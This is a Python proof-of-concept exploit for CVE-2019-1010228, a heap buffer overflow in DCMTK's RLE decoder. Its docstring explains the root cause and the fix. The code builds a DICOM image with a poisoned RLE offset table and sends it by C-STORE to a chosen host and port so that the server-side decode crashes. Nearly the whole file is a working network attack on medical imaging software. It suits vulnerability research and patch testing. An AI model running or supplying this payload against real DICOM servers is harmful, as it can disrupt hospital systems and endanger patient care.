#!/usr/bin/env python3
"""
PoC for DCMTK CVE-2019-1010228 (DCMTK bug #858) — heap buffer overflow
(CWE-787) in the RLE codec, reached server-side by a single C-STORE-RQ
carrying a crafted RLE Lossless image.

VERIFIED crash (real DCMTK 3.6.3 + ASan, server side):
  AddressSanitizer: heap-buffer-overflow
    #0 DcmRLEDecoder::literal()            dcrledec.h:230
    #1 DcmRLEDecoder::decompress()         dcrledec.h:114
    #2 DcmRLECodecDecoder::decode()        dcrleccd.cc:301   <-- unguarded decompress
    #5 DcmPixelData::chooseRepresentation()
    #7 main                                dcmdrle.cc (RLE-decode tool)

Root cause (fixed in commit 40917614e, DCMTK-3.6.4):
  DcmRLECodecDecoder::decode() trusts the attacker-controlled RLE segment
  offset table (rleHeader[]). For a non-last stripe it computes the number of
  input bytes to feed the bit-stream decoder straight from the offset table:
      inputBytes = rleHeader[i+2] - rleHeader[i+1];        // dcrleccd.cc:274/278
      ...
      while ((inputBytes > (fragmentLength - byteOffset)) && result.good())
          { decompress(...); result = pixSeq->getItem(...); }  // getItem fails
      result = rledecoder.decompress(rleData + byteOffset, inputBytes); // :301
  When rleHeader[i+2] is huge, `inputBytes` becomes ~1 GB. getItem() for the
  (non-existent) next fragment fails and sets `result` bad, but 3.6.3 does NOT
  bail out -- it runs the line-301 decompress() anyway with the bogus
  multi-hundred-MB length. decompress() then walks `rleData + byteOffset ...`
  far past the end of the small heap fragment (in literal()/replicate()) -> OOB
  -> ASan abort. The fix inserts three lines right after the offset-resolution
  loop: `if (result.bad()) return EC_CannotChangeRepresentation;`

Trigger geometry:
  * BitsAllocated 16 -> BytesAllocated 2, SamplesPerPixel 1 -> numberOfStripes
    must equal 2 (decode() validates this at dcrleccd.cc:170).
  * rleHeader[0]=2 (2 stripes); rleHeader[1]=64 (stripe-0 offset, valid, just
    past the 64-byte RLE header); rleHeader[2]=0x40000000 (stripe-1 offset:
    bogus, makes inputBytes(stripe 0) ~1 GB).
  * Rows/Columns large (512x512) so bytesPerStripe is big enough that the
    output buffer is not filled before decompress over-reads the input.
  * One trailing 0x7f byte = a 128-byte literal-run marker, so literal() copies
    128 bytes from a fragment that has only ~1 body byte -> the over-read.

Reachability over the DICOM network (pre-auth, CVSS 9.8): one A-ASSOCIATE +
one C-STORE-RQ proposing the RLE Lossless transfer syntax (1.2.840.10008.1.2.5).
The Storage SCP (storescp) accepts the RLE presentation context and stores the
object; its --exec-on-reception hook then runs dcmdrle on the received file,
which registers the RLE codec and calls chooseRepresentation() ->
DcmRLECodecDecoder::decode() -> the crash. (storescp itself refuses to combine
--accept-all with a forced uncompressed write TS, so the decode is driven by the
dcmdrle reception hook -- the exact "DICOM file processing / DICOM-to-image
conversion" vector named in the advisory, fed by the inbound C-STORE.)

Usage: poc_rle_1010228.py <host> <port>
"""
import struct
import sys

from pydicom.dataset import Dataset, FileMetaDataset
from pydicom.encaps import encapsulate
from pydicom.uid import (
    RLELossless,
    SecondaryCaptureImageStorage,
    generate_uid,
)
from pynetdicom import AE
from pynetdicom.presentation import build_context


def build_malformed_rle_fragment():
    """One RLE fragment: a 64-byte header with a poisoned offset table + a tiny
    body. numberOfStripes=2, stripe-1 offset is bogus (0x40000000) so the
    stripe-0 inputBytes computed from the offset table is ~1 GB."""
    header = [0] * 16
    header[0] = 2            # numberOfStripes == 2 (== BytesAllocated*Samples)
    header[1] = 64           # stripe-0 offset: valid, right after the header
    header[2] = 0x40000000   # stripe-1 offset: bogus -> inputBytes(s0) ~1 GB
    # header[3..15] = 0
    rle_header = b"".join(struct.pack("<I", v) for v in header)

    # A single 0x7f byte = "next 128 bytes are a literal run". decompress() will
    # then try to copy 128 bytes from cp, racing off the end of this fragment.
    body = bytes([0x7F])
    fragment = rle_header + body
    if len(fragment) % 2:                 # DICOM items must be even length
        fragment += b"\x00"
    return fragment


def build_dataset():
    ds = Dataset()
    ds.file_meta = FileMetaDataset()
    ds.file_meta.MediaStorageSOPClassUID = SecondaryCaptureImageStorage
    ds.file_meta.MediaStorageSOPInstanceUID = generate_uid()
    ds.file_meta.TransferSyntaxUID = RLELossless

    ds.SOPClassUID = SecondaryCaptureImageStorage
    ds.SOPInstanceUID = ds.file_meta.MediaStorageSOPInstanceUID
    ds.PatientName = "RLE^Overflow"
    ds.PatientID = "CVE-2019-1010228"

    # BitsAllocated 16 -> 2 stripes (decode() requires numberOfStripes == 2).
    # Large geometry so the output buffer outlives the input over-read.
    ds.SamplesPerPixel = 1
    ds.PhotometricInterpretation = "MONOCHROME2"
    ds.Rows = 512
    ds.Columns = 512
    ds.BitsAllocated = 16
    ds.BitsStored = 16
    ds.HighBit = 15
    ds.PixelRepresentation = 0

    # encapsulate() emits a Basic Offset Table + our fragment; pydicom appends
    # the (FFFE,E0DD) sequence delimiter on write.
    ds.PixelData = encapsulate([build_malformed_rle_fragment()])
    ds["PixelData"].is_undefined_length = True

    ds.is_little_endian = True
    ds.is_implicit_VR = False
    return ds


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 11112
    print(f"[*] Target {host}:{port}  CVE-2019-1010228 RLE decoder heap overflow")

    ds = build_dataset()
    ae = AE(ae_title=b"OIDA-POC")
    # Propose the SOP class over the RLE Lossless transfer syntax explicitly.
    ctx = build_context(SecondaryCaptureImageStorage, RLELossless)
    ae.requested_contexts = [ctx]

    assoc = ae.associate(host, port, ae_title=b"ANY-SCP")
    if not assoc.is_established:
        print("[!] association rejected/aborted — server did not accept RLE ctx")
        return
    print("[+] association established (Secondary Capture / RLE Lossless)")
    print("[*] -> C-STORE-RQ: 512x512/16-bit RLE, stripe-1 offset 0x40000000 "
          "(inputBytes ~1 GB)")
    try:
        status = assoc.send_c_store(ds)
        if status:
            print(f"[*] <- C-STORE status 0x{status.Status:04x}")
        else:
            print("[+] no/empty C-STORE response")
    except Exception as e:
        print(f"[+] send_c_store raised ({e})")
    finally:
        try:
            assoc.release()
        except Exception:
            pass
    print("[*] Stored. The server's dcmdrle reception hook now decodes the RLE "
          "pixel data.")
    print("[*] Check `docker logs` for ASan heap-buffer-overflow in "
          "DcmRLEDecoder::literal / dcrledec.h:230 (via dcrleccd.cc:301).")


if __name__ == "__main__":
    main()
